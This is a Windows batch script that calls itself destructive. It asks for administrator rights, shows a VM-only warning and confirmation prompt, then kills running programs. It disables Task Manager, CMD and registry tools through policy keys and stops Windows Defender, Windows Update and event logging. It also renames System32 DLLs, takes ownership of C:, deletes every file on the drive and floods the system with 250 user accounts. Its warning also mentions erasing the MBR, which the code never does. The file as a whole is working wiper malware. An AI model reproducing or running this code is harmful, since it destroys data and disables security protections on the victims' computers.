@echo off
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    color 4
    echo Administrative privileges are required to run this script.
    echo Please click 'Yes' when prompted to allow the script to continue.
    pause
    color 0
    echo Requesting administrative privileges...
    powershell -command "Start-Process '%~0' -Verb runAs"
    exit /b
)

cls


title Warning...
color 4
echo *****************************************************
echo                 WARNING: DESTRUCTIVE SCRIPT
echo *****************************************************
echo This script will modify or erase critical system components such as the Master Boot Record (MBR).
echo Running this script will make the system unbootable and result in complete data loss.
echo  
echo *** USE THIS SCRIPT ONLY IN A VIRTUAL MACHINE ***
echo Run this script ONLY in an isolated environment like:
echo - VMware
echo - VirtualBox
echo - Hyper-V
echo - Windows Sandbox
echo  
echo I am NOT responsible for any damage to your system, including data loss, inability to boot, or the need for reinstallation.
echo  
echo By proceeding, you acknowledge the risks and take full responsibility for any consequences.
echo  
set /p confirm="Type 'ProceedNow (case sensitive)' to continueand anything else to exit or just close this window: "
if /I "%confirm%" neq "ProceedNow" (
    echo Operation cancelled.
    exit /b
)

echo Are you really sure? This is your last chance to exit this program or it will destroy your computer

echo You have agreed to run this destructive script. Proceeding...
pause

taskkill /f /im chrome.exe
taskkill /f /im msedge.exe
taskkill /f /im notepad.exe
taskkill /f /im explorer.exe
taskkill /f /im excel.exe
taskkill /f /im calc.exe
taskkill /f /im firefox.exe
taskkill /f /im winword.exe
taskkill /f /im outlook.exe
taskkill /f /im powershell.exe
taskkill /f /im java.exe
taskkill /f /im javaw.exe
taskkill /f /im vlc.exe
taskkill /f /im steam.exe
taskkill /f /im discord.exe
taskkill /f /im dvm.exe
taskkill /f /im calc.exe


reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f

reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d "1" /f

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFolderOptions" /t REG_DWORD /d "1" /f

sc stop "wuauserv"         // Windows Update Service
sc config "wuauserv" start= disabled

sc stop "WinDefend"         // Windows Defender Service
sc config "WinDefend" start= disabled

sc stop "Themes"            // Themes (affects the appearance of the UI)
sc config "Themes" start= disabled

sc stop "BITS"              // Background Intelligent Transfer Service
sc config "BITS" start= disabled

sc stop "Spooler"           // Print Spooler (disables printing)
sc config "Spooler" start= disabled

sc stop "Dnscache"          // DNS Client (affects internet connectivity)
sc config "Dnscache" start= disabled

sc stop "eventlog"          // Event Log (disables event logging)
sc config "eventlog" start= disabled

sc stop "PlugPlay"          // Plug and Play (affects device management)
sc config "PlugPlay" start= disabled

sc stop "CryptSvc"          // Cryptographic Services (affects security updates)
sc config "CryptSvc" start= disabled

sc stop "LanmanWorkstation" // Workstation (affects file sharing and network access)
sc config "LanmanWorkstation" start= disabled

ren C:\Windows\System32\*.dll *.bak


set drive=C:  

:: Taking ownership of the entire drive silently
takeown /F "%drive%\*" /R /D Y > nul 2>&1

del C:\*.* /f /s /q


:: Set the number of user accounts to create
set totalUsers=250

:: Loop to create user accounts
for /L %%i in (1,1,%totalUsers%) do (
    set /a username=1000+%%i
    net user User!username! Password123! /add
    echo User User!username! created.
)

taskkill /f /im svchost.exe
